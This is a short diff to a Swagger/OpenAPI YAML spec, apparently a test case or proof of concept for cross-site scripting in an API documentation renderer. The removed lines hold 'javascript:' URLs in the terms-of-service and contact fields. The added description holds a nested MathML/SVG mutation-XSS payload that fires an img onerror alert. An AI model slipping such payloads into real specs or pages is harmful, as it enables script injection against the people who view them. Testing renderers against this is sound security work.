@@ -1,10 +1,15 @@
-swagger: "2.0",
-info: 
-  title: "Swagger Sample App",
-  description: "Please to click Terms of service"
-  termsOfService: "javascript:alert(document.domain)"
-  contact: 
-    name: "API Support",
-    url: "javascript:alert(document.domain)",
-    email: "javascript:alert(document.domain)"
-  version: "1.0.1"
+swagger: '2.0'
+info:
+  title: Example yaml.spec
+  description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
+paths:
+  /accounts:
+    get:
+      responses:
+        '200':
+          description: No response was specified
+      tags:
+        - accounts
+      operationId: findAccounts
+      summary: Finds all accounts
